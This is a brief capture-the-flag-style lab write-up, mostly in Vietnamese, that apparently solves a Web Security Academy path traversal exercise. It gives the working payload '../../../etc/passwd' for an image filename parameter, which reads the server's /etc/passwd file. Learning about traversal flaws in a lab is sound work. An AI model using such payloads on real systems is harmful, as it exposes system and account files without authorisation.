# Lab: File path traversal, simple case

## Question

This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Answer

Dao quanh một vòng trang web mục tiêu, phát hiện url của hình ảnh có dạng:

```text
https://0a8700d803c939438273010500cb00b1.web-security-academy.net/image?filename=11.jpg
```

Chúng ta thấy tài nguyên hình ảnh được request qua url endpoint `image` và param `filename`

Thử khai thác path travesal, mục tiêu là file `etc/passwd`:

```text
?filename=etc/passwd
```

```text
"No such file"
```

Không thành công, vì trong hệ thống thư mục lưu trữ tài nguyên ảnh sẽ không cùng cấp với thư mục root.

Trước hết phải sử dụng payload `../` để quay trở lại folder trước đó, cho tới khi trở về root `/` và truy cập file `/etc/passwd`

```text
?filename=../../../etc/passwd
```

Done~~
